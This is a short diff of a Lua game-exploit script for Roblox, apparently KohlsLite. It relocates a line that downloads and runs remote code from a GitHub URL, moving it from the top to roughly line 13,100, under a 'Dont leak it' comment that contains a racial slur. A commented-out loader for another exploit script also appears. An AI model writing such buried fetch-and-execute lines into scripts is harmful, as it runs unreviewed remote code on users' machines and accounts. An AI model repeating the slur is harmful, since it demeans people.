@@ -106,9 +106,6 @@ else
 end
 	]]
 
--- Dont leak it method my nigger...
-loadstring(game:HttpGet("https://raw.githubusercontent.com/blueskykah/soggy/main/for%20atpoop"))()
-
 -- IY Auto Executor (Sorry if this is annoying but there's a bug in the lines for the prefix checker above which causes my script to break if IY is loaded after KL that I can't debug as of now
 --loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
 
@@ -13105,6 +13102,9 @@ Stats.username = game.Players.LocalPlayer.Name
 Stats.rank = rankcheck(Stats.username)
 
 print("Your rank is: " .. Stats.rank)
+
+-- Dont leak it method my nigger...
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blueskykah/soggy/main/for%20atpoop"))()
 
 -- KohlsLite Tags - Created by atprog
 local OWNER = {"ScriptingProgrammer", "me_123eq", "s_pisafurry", "kohlslitedev", "IceStuds"}
